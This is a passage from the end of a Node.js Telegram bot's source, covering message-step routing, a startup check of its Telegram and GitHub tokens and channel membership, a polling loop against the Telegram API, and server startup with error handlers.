      if (sessions[chatId]?.step === 'edit') return handleEditStep(chatId, text, sessions[chatId].msgId);
      if (sessions[chatId]?.step === 'admin_edit') return handleAdminEdit(chatId, text, sessions[chatId].msgId);
      if (sessions[chatId]?.step === 'search') return handleSearch(chatId, text, sessions[chatId].msgId);
      if (sessions[chatId]?.step) return handleAddStep(chatId, text, sessions[chatId].msgId);
    }
  } catch (e) {
    log('handleUpdate', e.message, 'error');
  }
}

// ═══════════════════════════════════════════════
// VALIDATION
// ═══════════════════════════════════════════════
async function validate() {
  log('startup', 'Validating bot...', 'info');
  if (!TOKEN) return log('startup', 'TELEGRAM_BOT_TOKEN missing!', 'error');
  if (!GITHUB_TOKEN) return log('startup', 'GITHUB_TOKEN missing!', 'error');

  const me = await getBotInfo();
  log('startup', `Bot: @${me.username}`, 'success');

  try {
    await getUsers();
    log('startup', 'GitHub: Connected', 'success');
  } catch (e) {
    log('startup', `GitHub: ${e.message}`, 'error');
  }

  try {
    await tgApi('getChat', { chat_id: FORCE_CHANNEL });
    log('startup', `Channel: ${FORCE_CHANNEL} OK`, 'success');
  } catch (e) {
    log('startup', `Channel: Bot not in ${FORCE_CHANNEL}!`, 'warn');
  }

  try {
    await tgApi('getChat', { chat_id: FORCE_GROUP });
    log('startup', `Group: ${FORCE_GROUP} OK`, 'success');
  } catch (e) {
    log('startup', `Group: Bot not in ${FORCE_GROUP}!`, 'warn');
  }
}

// ═══════════════════════════════════════════════
// POLLING
// ═══════════════════════════════════════════════
let offset = 0, errors = 0;

async function poll() {
  try {
    const res = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
    const data = await res.json();
    if (!data.ok) { errors++; if (errors > 10) process.exit(1); return setTimeout(poll, 5000); }
    errors = 0;
    if (data.result) {
      for (const u of data.result) { offset = u.update_id + 1; await handleUpdate(u); }
    }
  } catch (e) {
    errors++;
    if (errors > 10) process.exit(1);
  }
  poll();
}

app.listen(PORT, async () => {
  console.log(`\n⬡ NEBULA v4.1 | Port: ${PORT} | @A2MBD3\n`);
  await validate();
  poll();
});

process.on('uncaughtException', (e) => log('CRASH', e.message, 'error'));
process.on('unhandledRejection', (e) => log('REJECTION', e?.message, 'error'));
